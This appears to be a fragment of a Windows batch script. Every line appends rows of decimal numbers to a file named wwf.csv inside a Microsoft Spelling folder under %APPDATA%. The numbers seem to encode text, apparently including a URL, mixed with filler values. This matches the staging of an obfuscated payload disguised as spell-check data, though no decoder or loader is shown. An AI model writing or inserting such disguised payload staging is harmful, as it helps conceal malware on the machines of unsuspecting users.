>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(217.782;70.812;10.2744;937.64;951.118;951.179;6479.643;176.895;53.879;15.9142;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.84;46.3;685.29;8210.431;4.677;48.575;48.0900;673.160;371.160;569.134;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2526.567;104.816;116.812;58.2817;347.47;399.114;808.46;1250.809;105.499;114.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.3582;811.102;816.46;799.111;6999.809;47.812;107.805;47.3569;699.114;808.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.114;0341.811;100.817;99.816;115.2017;647.77;805.99;814.111;9296.815;111.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.584;105.8132;809.101;783.116;397.109;4402.812;80.467;65.346;99.3478;814.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.88;66.8;7020.343;6.71;5.75;7.1038;41.1;64.76;448.74;9799.448;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.56;8.343;6.1223;61.5;65.7;648.2;4082.834;60.804;116.816;112.4662;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(558.47;347.119;819.119;1487.646;109.805;99.814;111.6024;815.111;802.116;746.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3608.811;109.547;112.807;105.5751;447.99;801.114;816.115;7630.747;77.805;99.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.9975;815.111;802.116;484.105;7068.809;101.583;116.597;109.8966;812.80;367.65;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(546.99;7284.814;116.448;19.76;3.6184;685.29;737.4;612.48;1689.310;6.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.66;1.7642;55.5;57.3;38.48;3960.513;6.69;42.834;72.2201;834.247;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(713.1;41.5;3735.65;0.73;130.71;1.0518;30.20;421.137;843.202;2638.643;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5.712;127.525;234.5433;323.125;364.18;711.156;7520.838;21.429;199.51;67.4156;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.210;894.254;807.117;1759.819;78.833;59.870;224.5337;869.236;54.187;801.153;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0132.913;153.866;255.627;20.2249;804.141;448.43;338.106;8783.398;211.913;143.909;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(251.5135;635.157;826.64;923.163;8101.931;97.339;182.893;21.7315;908.243;781.149;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(898.28;2230.471;204.893;233.949;252.8496;644.156;51.173;826.174;9035.871;125.430;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(204.929;40.9285;499.100;525.168;921.29;6952.532;106.869;232.946;45.4250;59.136;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.186;869.122;8510.879;155.550;55.922;78.9762;455.64;61.66;775.255;2852.929;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(69.887;147.830;94.7127;838.92;672.67;478.160;1799.927;184.879;221.941;176.1020;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(901.156;549.245;495.162;1013.691;47.896;158.848;104.0677;881.107;923.225;920.170;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4940.835;24.802;4.482;53.8286;841.171;903.129;929.65;0684.874;8.898;96.864;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(135.9662;906.109;811.104;814.225;8328.849;55.691;58.800;123.1532;831.212;819.255;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(662.149;8288.365;242.939;167.847;1.6792;444.55;39.132;833.155;0464.853;109.699;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(29.955;132.8314;931.145;60.249;925.56;2579.940;244.803;197.572;183.4850;760.169;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.101;936.45;4794.932;146.910;79.850;164.8790;884.161;758.175;62.204;2416.898;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(170.360;164.64;132.0867;748.181;925.183;950.48;3055.830;5.955;48.830;3.3589;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(931.160;33.2;51.2;4317.42;19.551;0.70;1.0027;581.158;841.143;564.113;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7022.863;14.465;0.60;0.2054;30.1;581.48;713.6;9456.59;42.834;72.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(247.3977;513.1;71.11;45.0;4951.648;126.549;11.548;9.9003;56.3;785.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.19;6071.62;85.683;49.719;48.0091;617.6;33.85;64.8;5263.519;10.387;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.815;104.1625;805.110;803.116;811.110;7518.449;16.548;14.36;3.8568;485.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(57.19;77.82;8714.801;100.809;111.810;100.1690;449.30;748.28;76.3;1019.685;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.410;19.421;77.8100;805.99;814.111;815.111;7242.802;116.632;67.811;114.8409;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.111;814.97;816.105;6212.811;110.449;40.348;38.7665;46.3;585.4;53.19;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1973.631;77.805;99.814;111.2322;815.111;802.116;732.67;3537.811;100.801;32.383;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.2322;803.110;805.110;803.32;4130.580;67.365;32.650;48.6771;749.49;348.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(523.13;2252.549;57.348;53.648;50.5370;450.49;651.55;752.54;4356.790;23.513;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.548;48.6008;753.48;550.50;549.51;8444.355;52.554;90.348;116.4797;449.11;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.9;76.3;1554.385;4.56;19.62;85.2123;683.49;719.48;617.6;0947.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(85.34;8.519;10.9044;587.97;815.104;805.110;3159.803;116.811;110.449;16.0015;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(648.14;56.3;685.4;1192.77;19.77;82.801;100.7357;809.111;810.100;349.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3863.448;28.46;3.485;4.1987;310.19;321.77;805.99;6126.814;111.815;111.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.0117;532.67;811.114;812.111;8501.814;97.816;105.811;110.5258;449.30;648.28;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.3;3913.685;4.43;19.621;77.1318;805.99;814.111;815.111;7279.802;116.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.811;114.2087;812.111;814.97;816.105;5486.811;110.448;130.61;34.9686;548.13;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.9;542.134;6537.672;134.947;13.41;1.1321;41.5;60.3;830.1;7255.615;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.548;130.31;10.0311;52.130;41.1;60.149;3951.690;198.834;105.371;29.1680;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(552.30;941.85;895.102;7553.817;246.398;84.624;88.1008;420.103;639.240;863.42;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3990.898;3.572;188.930;86.8038;652.127;373.97;62.238;8924.832;120.802;39.848;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.9822;433.44;881.161;936.183;2030.905;59.877;168.882;228.1014;528.7;802.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(929.60;2485.452;83.740;227.911;239.0873;939.83;332.33;747.72;1355.327;241.645;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(171.63;135.1579;938.234;490.159;933.72;1985.871;163.778;115.314;95.1124;759.163;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(872.251;593.145;3575.909;13.888;51.649;167.9412;951.124;887.23;805.138;0294.514;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(122.741;86.937;44.3402;318.231;942.227;857.224;9552.899;61.822;51.898;192.9720;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(895.143;844.94;935.251;7151.949;244.825;91.552;73.6838;916.42;484.235;808.16;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1070.341;136.833;64.899;222.5100;895.165;697.229;951.143;5842.861;121.804;55.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(58.4058;949.9;815.239;756.28;4949.479;134.317;155.728;241.9061;938.51;521.164;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(955.238;7306.888;174.872;101.892;113.0661;667.117;860.7;945.164;0870.901;113.924;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(197.866;53.7711;944.128;651.46;873.144;9213.836;248.851;217.838;242.5724;837.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(568.177;828.106;0779.923;144.479;237.377;121.5801;714.86;809.165;543.54;3026.892;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(134.419;146.664;193.0306;898.19;901.32;350.96;9444.863;6.810;228.808;161.7128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(329.218;871.178;921.206;5521.842;68.845;2.33;1.5442;40.1;863.130;41.126;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9288.348;130.61;122.448;31.5873;76.3;485.29;537.4;3457.724;48.322;6.510;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.9123;36.1;44.1;830.55;1894.576;8.31;6.78;43.5391;46.1;65.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(57.3;0907.63;48.729;6.43;85.3293;329.14;34.22;54.20;8806.687;130.526;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(174.774;185.7360;937.235;526.130;938.133;5944.580;22.946;239.570;98.1420;841.207;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.80;66.3;3193.685;29.617;4.773;48.9108;371.164;369.48;667.49;7288.441;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(48.739;6.33;85.1448;54.11;319.32;377.105;5059.499;114.811;115.811;102.0558;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.32;479.112;801.114;9536.497;116.805;111.810;115.3815;632.80;817.101;814.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1083.811;32.782;105.799;111.8730;749.22;748.20;66.3;6485.485;4.65;19.513;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.9050;751.48;348.49;650.43;7715.752;53.452;49.751;53.1442;348.31;56.3;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(585.29;8796.635;4.524;48.722;128.7086;620.72;810.100;929.80;1939.35;211.830;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(170.523;55.9503;655.34;881.109;868.202;2177.817;2.849;48.784;6.5379;63.85;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(629.31;74.77;1256.448;75.348;73.860;71.1014;860.69;834.67;804.116;9245.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.358;47.447;119.0791;819.119;546.109;805.99;1868.814;111.815;111.802;116.7795;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(646.99;811.109;447.112;2207.807;105.811;112.815;47.4905;399.114;808.47;377.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1967.399;67.811;100.683;105.3126;803.80;567.65;350.48;3623.649;49.395;50.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.2690;349.45;448.55;645.48;5606.756;46.499;114.808;48.8839;397.6;78.43;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.1;9558.45;5.47;1.61;4.5654;785.48;683.48;781.6;5451.58;43.66;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.65;5.4165;37.48;42.134;469.104;3530.816;116.812;58.547;47.4233;819.119;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.46;809.105;5736.599;114.811;115.811;102.5824;816.46;699.111;809.47;8121.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(107.805;111.812;115.6804;447.99;801.114;816.115;2019.747;77.805;99.367;111.1522;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.83;805.103;680.67;6983.365;50.448;49.749;95.4568;550.48;749.49;545.48;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3787.755;45.448;56.346;99.6273;814.116;648.12;56.3;5903.385;29.419;1.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(255.9845;44.2;648.0;648.13;8885.76;9.442;134.472;134.4145;947.13;51.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(311.5;7338.70;3.830;2.51;0.2756;490.15;828.173;546.0;2841.858;174.902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(174.836;44.2845;848.132;439.160;893.210;9850.393;67.935;253.526;142.7454;334.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(487.251;825.142;3540.810;230.355;48.691;221.3259;849.17;737.109;343.18;9096.339;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(26.909;203.943;130.1044;79.151;482.177;939.159;8645.916;10.844;248.395;246.5351;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.140;51.14;801.16;4012.809;227.61;242.825;41.9222;596.182;803.56;948.159;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1340.869;238.952;68.617;246.7269;825.86;808.189;824.114;4772.826;44.919;30.930;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(214.4754;790.133;431.53;811.197;3933.638;86.801;45.824;9.2175;852.93;893.160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(891.4;5040.918;157.561;43.820;90.1053;831.12;955.162;915.10;0954.881;13.826;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.843;131.5651;804.230;723.90;487.170;1765.438;178.384;178.813;236.3175;945.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(839.114;881.69;3365.910;87.839;253.613;85.7852;929.187;433.161;889.142;3890.378;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.806;210.872;210.6936;818.179;73.45;803.97;4795.902;181.614;198.818;126.4392;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(862.54;823.81;912.216;1860.925;89.894;186.836;27.9619;803.214;808.246;904.137;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6794.810;14.917;81.347;82.4766;486.6;436.163;54.108;0033.690;254.799;87.837;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(91.9205;869.48;954.180;810.5;0511.906;19.876;113.620;48.5727;817.190;828.243;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(558.118;5693.354;119.826;179.881;93.5797;610.230;75.176;804.8;1608.927;91.856;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(15.902;49.0128;585.247;50.50;649.125;6180.497;126.477;218.906;38.2929;850.217;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(742.157;371.183;8102.954;27.685;174.824;74.7821;340.48;548.73;837.98;4040.806;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(236.818;47.884;10.0347;895.230;895.214;465.25;7531.955;154.451;45.725;201.9993;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(922.56;895.146;837.147;1088.872;247.345;162.370;63.1639;741.166;817.170;930.244;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8848.553;73.930;56.861;254.9427;923.21;510.254;853.86;2267.636;175.31;57.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.9099;483.184;410.96;826.216;2803.903;213.846;40.917;79.0764;938.146;863.234;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(746.53;8748.939;237.905;107.947;235.6337;334.120;931.6;566.145;9250.68;159.922;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.359;193.4068;731.235;357.130;931.179;8345.865;244.322;181.378;27.2572;454.143;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(927.241;312.54;9747.890;148.908;247.414;223.4671;850.17;951.241;425.176;6536.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(125.825;249.832;230.2059;834.254;911.115;616.219;2070.490;92.873;121.868;248.3070;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(568.173;876.147;822.88;4822.914;132.879;216.847;196.0158;928.243;810.54;803.125;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1332.526;103.950;161.927;217.6422;831.46;900.139;910.75;2265.446;175.418;157.366;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(213.6880;937.191;836.63;569.23;4185.669;143.806;248.803;81.5248;840.205;828.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(826.166;3525.877;155.939;60.734;40.8098;527.70;852.29;611.189;5100.893;155.310;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(16.873;163.7470;870.245;862.243;952.93;8070.821;231.846;35.909;77.8335;932.173;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.226;833.80;8233.451;131.548;130.56;7.1932;548.130;73.239;860.3;5763.52;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.52;2.710;97.5889;322.104;552.0;30.0;8242.30;0.728;48.413;6.3630;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(59.42;834.72;834.247;6822.713;1.41;5.45;0.5261;548.95;549.19;548.17;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0691.56;10.49;146.538;137.4238;847.242;544.100;41.25;1341.722;3.599;111.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(49.0370;625.48;523.6;510.9;1790.846;38.837;147.942;44.0374;800.1;425.22;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(39.109;1575.805;99.814;111.815;111.7154;802.116;349.45;448.43;6266.56;3.385;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4.63;19.7718;336.77;805.99;814.111;4027.815;111.802;116.632;82.2298;811.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.32;667.101;4238.814;116.805;102.805;99.9937;397.116;801.32;565.117;1989.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.811;114.805;116.3088;821.48;730.23;713.48;2800.355;48.352;48.451;49.1633;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(450.53;651.48;557.90;7601.723;13.750;49.448;52.2292;348.51;649.51;548.51;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2325.348;57.490;48.819;49.3754;311.48;49.6;63.85;2579.44;6.319;2.385;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.6292;649.19;348.17;46.3;7953.585;4.78;19.610;87.1741;597.115;804.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.103;0567.816;111.810;49.516;48.8091;314.6;33.85;44.7;4593.619;7.782;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.800;109.5079;811.110;800.49;630.48;0595.428;6.43;85.44;10.1592;419.21;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(377.105;399.114;3306.811;115.811;102.816;32.2600;567.111;814.112;811.114;6047.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.805;111.810;49.1059;333.48;531.6;73.85;2760.64;3.519;24.777;105.4928;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(599.114;811.115;811.102;5843.816;32.384;105.809;101.4021;545.83;816.97;809.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6645.632;80.667;65.548;130.6821;41.34;548.13;76.9;2422.542;134.672;134.947;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(13.5390;61.1;41.5;30.3;7722.830;1.615;0.348;130.9957;51.10;42.130;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.1;2702.40;159.861;108.877;223.9966;919.72;846.42;824.107;5217.746;25.925;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(189.926;227.4130;897.153;481.35;780.173;3149.906;221.424;78.636;15.5305;938.209;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(867.209;476.173;7768.816;48.532;17.935;7.8064;913.84;849.21;573.148;5529.427;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(66.846;174.852;92.1602;548.38;918.0;807.232;5589.823;189.936;137.37;15.3093;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(947.14;64.152;940.137;6267.904;31.903;51.536;135.7366;857.242;944.103;328.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8578.952;123.931;136.329;234.8685;931.78;863.161;893.35;0393.683;202.841;250.469;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(207.4723;79.208;794.175;908.176;2900.566;4.862;249.866;108.6290;847.103;915.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(920.70;9044.583;176.834;208.929;40.2166;470.46;739.172;834.79;0174.785;82.612;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(228.33;44.5846;951.106;844.144;748.110;1637.835;243.389;48.857;250.4016;826.214;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(851.179;932.33;4607.851;126.948;210.519;243.4345;58.183;583.109;582.180;2757.569;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(144.859;72.70;74.6620;771.102;717.39;341.102;2374.868;151.928;211.66;129.2804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(774.162;949.132;867.17;7778.571;20.59;130.859;132.9106;937.85;820.254;61.154;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6519.429;80.38;133.70;16.4931;748.70;937.183;922.35;7674.370;187.896;45.484;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(159.2307;875.30;820.65;349.119;2596.904;155.923;59.831;147.6989;861.97;32.181;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(729.13;4952.877;252.947;155.878;1.5244;906.34;675.84;955.249;3088.35;195.894;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.311;2.0182;33.1;40.1;863.130;3703.71;171.348;130.31;167.8528;348.15;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.3;685.29;2797.619;1.41;255.34;5.6661;448.3;31.1;955.48;5800.529;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.33;85.729;14.3932;34.22;54.20;735.52;7124.948;217.682;70.812;10.3464;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(937.64;951.118;951.179;1575.643;176.895;53.879;15.1122;748.11;66.3;785.29;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3276.515;4.74;3.52;1.8482;834.48;516.6;79.43;8033.66;1.74;1.830;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(55.7165;421.1;54.3;62.1;9637.60;48.829;152.66;3.3511;585.29;735.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(829.144;8421.448;129.841;128.320;14.0587;872.130;496.64;586.39;1022.851;229.537;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(19.952;42.3779;925.10;383.149;689.228;0707.864;161.599;164.797;48.9821;395.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(319.48;517.6;5258.510;9.846;38.837;147.6115;942.44;800.1;725.22;4370.33;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.811;109.349;25.4687;748.23;66.10;49.146;5865.638;137.847;242.544;100.9227;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.25;622.9;809.105;4697.799;114.811;115.811;102.8444;816.49;645.48;643.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3440.43;85.34;3.719;36.8648;577.105;499.114;811.115;2380.811;102.816;32.482;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.0836;811.116;532.67;801.114;6038.816;105.802;105.699;97.4451;816.101;532.65;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.116;8195.804;111.814;105.816;121.9437;830.16;821.173;722.161;3322.474;160.865;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(173.476;115.3819;788.244;47.19;546.101;9558.448;80.56;3.685;29.4266;531.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(673.48;571.48;8539.669;160.667;160.565;134.8375;363.104;816.116;812.58;5279.747;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(47.499;114.808;46.3227;809.105;499.114;811.115;7953.811;102.816;46.399;111.8437;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.47;812.107;805.47;1119.699;114.808;47.812;114.1691;811.100;817.99;816.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2868.447;109.805;99.814;111.4926;815.111;802.116;814.111;1683.811;116.499;101.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.0888;646.99;814.108;548.84;3223.46;8.343;6.71;5.1077;35.7;41.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(64.72;9379.448;70.648;68.46;8.5455;643.6;41.5;45.7;1481.448;2.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(56.804;116.3585;816.112;758.47;747.119;5176.819;119.746;109.805;99.6580;814.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.111;802.116;9946.346;99.811;109.347;112.9413;807.105;747.99;801.114;3564.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.347;77.805;99.9574;814.111;815.111;802.116;4984.482;111.811;116.767;101.9153;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.116;746.99;814.116;9386.548;19.66;3.685;29.1065;337.4;712.48;710.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7832.68;43.46;1.35;5.5839;67.3;58.48;713.6;9631.69;42.834;72.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(247.3932;713.1;61.5;55.0;4122.53;130.62;1.70;16.9268;851.138;895.92;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(43.68;5875.654;221.933;180.873;119.3044;919.206;821.81;377.1;9827.877;46.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(113.391;109.8883;412.19;871.206;890.123;9643.843;184.646;212.618;162.6738;840.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(598.184;387.2;0587.903;78.732;19.480;153.5546;921.122;664.226;487.187;0238.875;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(88.854;28.925;29.6494;71.134;872.187;820.242;6744.839;208.936;59.31;238.9764;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(926.190;843.10;35.200;0955.841;72.926;240.783;21.1475;921.79;871.146;928.231;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5962.841;106.913;128.893;230.2240;848.242;66.47;833.3;6932.933;145.742;36.634;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.0322;951.246;952.228;820.153;2603.346;13.947;7.926;112.6397;888.24;578.157;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(842.107;6027.710;114.849;184.861;57.5541;856.103;745.197;781.14;8624.934;98.792;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(63.422;152.7827;839.32;463.226;57.26;7728.450;249.904;49.474;118.9317;349.61;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(743.114;311.200;5672.934;112.561;255.833;10.8478;719.223;894.10;797.142;6461.940;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(215.884;23.935;78.0739;839.127;897.53;543.94;5225.863;191.935;188.825;11.8259;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(766.123;912.83;814.33;7559.938;48.902;187.820;101.9580;692.91;61.23;310.20;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0154.614;210.918;20.852;245.6290;460.185;802.88;879.45;2211.747;231.949;133.834;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(204.0283;381.86;932.157;812.148;2618.808;172.757;76.912;246.9065;821.191;870.24;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(822.98;4993.441;239.862;155.441;52.4735;36.119;426.98;901.61;7825.430;109.631;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(130.940;11.7587;899.44;887.207;767.179;9944.929;249.936;125.881;227.7107;864.168;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.53;884.78;6984.897;113.435;18.538;118.1819;411.60;482.140;813.90;6532.470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.320;188.879;179.3557;876.77;803.200;859.66;2966.955;128.821;33.828;158.7353;
